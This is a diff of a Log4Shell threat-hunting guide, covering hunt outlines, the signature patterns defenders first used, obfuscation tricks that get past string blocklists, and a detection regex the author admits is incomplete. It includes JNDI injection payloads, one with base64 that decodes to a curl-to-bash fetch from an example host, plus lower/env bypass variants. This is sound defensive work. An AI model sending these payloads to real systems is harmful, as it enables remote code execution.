@@ -41,7 +41,7 @@ Here is an example using base64:
 `${jndi:ldap://caffeinatedsheep.com:12344/Basic/Command/Base64/KGN1cmwgLXMgY2FmZmVpbmF0ZWRzaGVlcC5jb206NTg3NCl8YmFzaA==}`
 
 ## The Hunts Outline
-Details can be found for each section bellow.
+The following are outlines for the separate hunts. Details on how to perform each step can be found bellow.
 
 ### The Hunt: Network Resource
 1. [**Scoping out a Query**](#scoping-out-a-query): Scope all relevant logs using the `${jndi\:` string. Create an output that you can run additional analysis on.
@@ -128,20 +128,30 @@ Examples of searches are provided in Splunk's Splunk Processing Lanagage and Ela
 
 
 ### The string blacklist bypass problem
-A bypass to popular mitigation is to blocklist some of the affected lookup strings. A simple method around this is to use upper or lower notations.
+Quickly after this vulnerability made its way into public view, the industry began to write detections for it. Initially the most of the industry was first trying to create signatures that would match the following patterns.
+
+${jndi:ldap://*
+${jndi:dns//*
+${jndi:rmi://*
+${jndi:corbal://*
+${jndi:http://*
+${jndi:iiop://*
+${jndi:nis://*
+
+But using environment variables or lower or upper commands, adversaries were able to send strings that the system would normalize to a valid attack string. So the Security vendors would miss the attack and those who used string blacklisting in Log4j to prevent the attack would see their prevention efforts bypassed.
 
 For example, the following may be logged:
 ```
 ${jndi:${lower:l}${lower:d}a${lower:p}://caffeinatedsheep.com/a}
 ${jndi:${lower:d}${lower:n}s://caffeinatedsheep.com/a}
 
-normalized to
+would be normalized to
 
 ${jndi:ldap://caffeinatedsheep.com/a
 ${jndi:dns://caffeinatedsheep.com/a
 ```
 
-There are other atmthods as well such as pulling in null values like imporper dates or this string which calls null environment variables before each letter.
+There are other methods as well such as pulling in null values like improper dates or this string which calls null environment variables before each letter.
 
 ```
 ${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//caffeinatedsheep.com/a}
@@ -151,7 +161,13 @@ normalized to
 ${jndi::ldap://caffeinatedsheep.com/a}
 ```
 
-Therefore our searches must account for these bypass method.
+Therefore our searches must account for these bypass method. We will not only have to occasionally modify the regular expression to accommodate for these variations. I have used the following regex to attempt to find instances where bypass techniques are used.
+
+#### regex: `((?:\$\{(?:[[:alnum:]]){1,}){1,3}\:.{1,}\})`
+
+**Update:** This regex is not sufficient to catch all forms of bypasses. You can see here  list of bypass examples that this pattern does not match agains.
+
+<h1><img src="https://github.com/christian-taillon/log4shell-hunting/blob/main/regex-bypass.png" width="700px"></h1>
 
 ### Threat Extraction
 Categorize the events based on Base64 encoding or remote network querying.
